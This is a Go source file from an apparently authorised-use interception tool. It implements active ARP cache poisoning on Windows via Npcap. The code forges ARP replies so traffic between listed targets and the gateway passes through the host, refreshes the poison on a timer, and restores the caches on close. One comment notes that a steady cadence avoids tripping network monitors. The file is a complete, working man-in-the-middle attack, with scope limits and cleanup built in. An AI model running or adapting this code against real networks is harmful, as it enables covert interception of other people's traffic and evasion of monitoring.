//go:build windows && npcap

package main

import (
	"bytes"
	"fmt"
	"net"
	"net/netip"
	"os/exec"
	"strings"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// arp_windows.go implements the optional active on-path positioner via ARP cache
// poisoning. It is the most sensitive module in the tool and is bounded by the
// scope already validated in validateARPScope (intercept.go): it only ever
// poisons the explicit target allow-list plus the gateway, and it restores every
// cache it touched on Close.
//
// Windows + Npcap + cgo only; cannot be built on the dev Mac. Verify on a
// Windows host with Npcap before any live use.

// winARP poisons each scoped target<->gateway pair so both directions transit
// this host. The kernel (with forwarding enabled by winForwarding) relays the
// frames onward, keeping every session alive while we capture.
type winARP struct {
	targets  []netip.Addr
	gw       netip.Addr
	interval time.Duration
	restore  bool

	iface  *net.Interface
	ourIP  net.IP
	ourMAC net.HardwareAddr
	handle *pcap.Handle

	macMu sync.Mutex
	macOf map[netip.Addr]net.HardwareAddr // resolved real MACs (for poisoning targets + restore)

	done      chan struct{}
	wg        sync.WaitGroup
	closeOnce sync.Once
}

func newARPController(c ARPConf, targets []netip.Addr, gw netip.Addr) (arpController, error) {
	interval := time.Duration(c.IntervalMS) * time.Millisecond
	if interval <= 0 {
		interval = 2 * time.Second
	}

	// Auto-detect the default gateway if the operator left it blank.
	if !gw.IsValid() {
		g, err := defaultGatewayWindows()
		if err != nil {
			return nil, fmt.Errorf("arp: gateway not set and auto-detect failed: %w", err)
		}
		gw = g
		logInfo("intercept", "arp: auto-detected gateway %s", gw)
	}

	iface, ourIP, err := ifaceForTarget(gw)
	if err != nil {
		return nil, fmt.Errorf("arp: locate local interface: %w", err)
	}

	// Open a dedicated injection handle (the capture source owns its own handle).
	h, err := pcap.OpenLive(npcapDeviceFor(iface), int32(defaultSnapLen), false, 250*time.Millisecond)
	if err != nil {
		return nil, fmt.Errorf("arp: open injection handle: %w", err)
	}

	a := &winARP{
		targets:  targets,
		gw:       gw,
		interval: interval,
		restore:  c.RestoreOnStop,
		iface:    iface,
		ourIP:    ourIP,
		ourMAC:   iface.HardwareAddr,
		handle:   h,
		macOf:    map[netip.Addr]net.HardwareAddr{},
		done:     make(chan struct{}),
	}
	return a, nil
}

// Start resolves the real MAC of the gateway and every target, then launches the
// re-poison loop. Resolution failures for an individual target are logged and
// that target is skipped — we never poison a host whose real MAC we don't know,
// because we couldn't restore it afterward.
func (a *winARP) Start() error {
	if err := a.resolveAll(); err != nil {
		return err
	}
	a.wg.Add(1)
	go a.loop()
	return nil
}

func (a *winARP) resolveAll() error {
	if mac, err := a.resolve(a.gw); err != nil {
		return fmt.Errorf("arp: cannot resolve gateway %s: %w", a.gw, err)
	} else {
		a.setMAC(a.gw, mac)
	}
	resolved := 0
	for _, t := range a.targets {
		mac, err := a.resolve(t)
		if err != nil {
			logWarn("intercept", "arp: skipping target %s (unresolved MAC, cannot safely poison/restore): %v", t, err)
			continue
		}
		a.setMAC(t, mac)
		resolved++
	}
	if resolved == 0 {
		return fmt.Errorf("arp: no targets resolved; refusing to start")
	}
	return nil
}

// loop re-sends the poison pair for every resolved target on each tick. ARP
// caches age out, so periodic refresh is what keeps us on-path; a tight,
// low-jitter cadence is also what avoids the flapping that monitors flag.
func (a *winARP) loop() {
	defer a.wg.Done()
	tick := time.NewTicker(a.interval)
	defer tick.Stop()
	a.poisonRound()
	for {
		select {
		case <-a.done:
			return
		case <-tick.C:
			a.poisonRound()
		}
	}
}

func (a *winARP) poisonRound() {
	gwMAC, ok := a.getMAC(a.gw)
	if !ok {
		return
	}
	for _, t := range a.targets {
		tMAC, ok := a.getMAC(t)
		if !ok {
			continue
		}
		// Tell the target that the gateway IP is at OUR MAC.
		if err := a.sendARPReply(a.ourMAC, a.gw, tMAC, t); err != nil {
			logDebug("intercept", "arp: poison target %s: %v", t, err)
		}
		// Tell the gateway that the target IP is at OUR MAC.
		if err := a.sendARPReply(a.ourMAC, t, gwMAC, a.gw); err != nil {
			logDebug("intercept", "arp: poison gateway for %s: %v", t, err)
		}
	}
}

// Close stops the loop and, if configured, restores every poisoned cache by
// broadcasting the correct mappings a few times (ARP is unreliable, so repeat).
func (a *winARP) Close() error {
	a.closeOnce.Do(func() {
		close(a.done)
		a.wg.Wait()
		if a.restore {
			a.restoreAll()
		}
		a.handle.Close()
	})
	return nil
}

func (a *winARP) restoreAll() {
	gwMAC, ok := a.getMAC(a.gw)
	if !ok {
		return
	}
	for i := 0; i < 3; i++ { // repeat: ARP has no delivery guarantee
		for _, t := range a.targets {
			tMAC, ok := a.getMAC(t)
			if !ok {
				continue
			}
			// Re-assert the truth: gateway is at gwMAC (to the target) and target is
			// at tMAC (to the gateway).
			_ = a.sendARPReply(gwMAC, a.gw, tMAC, t)
			_ = a.sendARPReply(tMAC, t, gwMAC, a.gw)
		}
		time.Sleep(150 * time.Millisecond)
	}
}

// sendARPReply emits a unicast ARP reply: "srcIP is at srcMAC", addressed to
// (dstMAC,dstIP). Poisoning sends our MAC as srcMAC; restore sends the real one.
func (a *winARP) sendARPReply(srcMAC net.HardwareAddr, srcIP netip.Addr, dstMAC net.HardwareAddr, dstIP netip.Addr) error {
	eth := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   []byte(srcMAC),
		SourceProtAddress: srcIP.AsSlice(),
		DstHwAddress:      []byte(dstMAC),
		DstProtAddress:    dstIP.AsSlice(),
	}
	buf := gopacket.NewSerializeBuffer()
	if err := gopacket.SerializeLayers(buf, gopacket.SerializeOptions{FixLengths: true},
		&eth, &arp); err != nil {
		return err
	}
	return a.handle.WritePacketData(buf.Bytes())
}

// resolve returns the real MAC for ip by issuing an ARP request and waiting for
// the reply on a short-lived handle. Bounded by a small timeout.
func (a *winARP) resolve(ip netip.Addr) (net.HardwareAddr, error) {
	// Open and arm the reply listener BEFORE sending the request, so a fast reply
	// that arrives almost immediately can't slip past us.
	rh, err := pcap.OpenLive(npcapDeviceFor(a.iface), 1500, false, 100*time.Millisecond)
	if err != nil {
		return nil, err
	}
	defer rh.Close()
	_ = rh.SetBPFFilter("arp")
	src := gopacket.NewPacketSource(rh, rh.LinkType())

	// Fire a who-has request now that we're listening.
	if err := a.sendARPRequest(ip); err != nil {
		return nil, err
	}
	deadline := time.NewTimer(2 * time.Second)
	defer deadline.Stop()
	for {
		select {
		case <-deadline.C:
			return nil, fmt.Errorf("timeout resolving %s", ip)
		case pkt, ok := <-src.Packets():
			if !ok {
				return nil, fmt.Errorf("capture closed resolving %s", ip)
			}
			if al := pkt.Layer(layers.LayerTypeARP); al != nil {
				arp := al.(*layers.ARP)
				if arp.Operation == layers.ARPReply && bytes.Equal(arp.SourceProtAddress, ip.AsSlice()) {
					mac := make(net.HardwareAddr, len(arp.SourceHwAddress))
					copy(mac, arp.SourceHwAddress)
					return mac, nil
				}
			}
		}
	}
}

func (a *winARP) sendARPRequest(ip netip.Addr) error {
	bcast := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	eth := layers.Ethernet{SrcMAC: a.ourMAC, DstMAC: bcast, EthernetType: layers.EthernetTypeARP}
	arp := layers.ARP{
		AddrType: layers.LinkTypeEthernet, Protocol: layers.EthernetTypeIPv4,
		HwAddressSize: 6, ProtAddressSize: 4, Operation: layers.ARPRequest,
		SourceHwAddress: []byte(a.ourMAC), SourceProtAddress: a.ourIP.To4(),
		DstHwAddress: []byte{0, 0, 0, 0, 0, 0}, DstProtAddress: ip.AsSlice(),
	}
	buf := gopacket.NewSerializeBuffer()
	if err := gopacket.SerializeLayers(buf, gopacket.SerializeOptions{FixLengths: true}, &eth, &arp); err != nil {
		return err
	}
	return a.handle.WritePacketData(buf.Bytes())
}

func (a *winARP) setMAC(ip netip.Addr, mac net.HardwareAddr) {
	a.macMu.Lock()
	a.macOf[ip] = mac
	a.macMu.Unlock()
}

func (a *winARP) getMAC(ip netip.Addr) (net.HardwareAddr, bool) {
	a.macMu.Lock()
	defer a.macMu.Unlock()
	m, ok := a.macOf[ip]
	return m, ok
}

// ifaceForTarget picks the local interface (and our IPv4 on it) whose subnet
// contains target — i.e. the NIC we'd use to reach the gateway.
func ifaceForTarget(target netip.Addr) (*net.Interface, net.IP, error) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil, nil, err
	}
	for i := range ifaces {
		ifc := &ifaces[i]
		if ifc.Flags&net.FlagUp == 0 || ifc.Flags&net.FlagLoopback != 0 || len(ifc.HardwareAddr) == 0 {
			continue
		}
		addrs, _ := ifc.Addrs()
		for _, ad := range addrs {
			ipnet, ok := ad.(*net.IPNet)
			if !ok || ipnet.IP.To4() == nil {
				continue
			}
			if ipnet.Contains(net.IP(target.AsSlice())) {
				return ifc, ipnet.IP.To4(), nil
			}
		}
	}
	return nil, nil, fmt.Errorf("no up IPv4 interface on the %s subnet", target)
}

// npcapDeviceFor maps a net.Interface to its Npcap device name. Npcap names
// devices \Device\NPF_{GUID}; the GUID is exposed via the adapter. We match by
// enumerating pcap devices and pairing on a shared unicast address.
func npcapDeviceFor(ifc *net.Interface) string {
	devs, err := pcap.FindAllDevs()
	if err != nil {
		return ""
	}
	ifAddrs, _ := ifc.Addrs()
	for _, d := range devs {
		for _, da := range d.Addresses {
			for _, ia := range ifAddrs {
				if ipnet, ok := ia.(*net.IPNet); ok && ipnet.IP.Equal(da.IP) {
					return d.Name
				}
			}
		}
	}
	return ""
}

// defaultGatewayWindows parses `route print -4` for the 0.0.0.0 default route.
func defaultGatewayWindows() (netip.Addr, error) {
	out, err := exec.Command("route", "print", "-4").Output()
	if err != nil {
		return netip.Addr{}, err
	}
	for _, line := range strings.Split(string(out), "\n") {
		f := strings.Fields(line)
		if len(f) >= 3 && f[0] == "0.0.0.0" && f[1] == "0.0.0.0" {
			if a, err := netip.ParseAddr(f[2]); err == nil {
				return a, nil
			}
		}
	}
	return netip.Addr{}, fmt.Errorf("default route not found in route table")
}
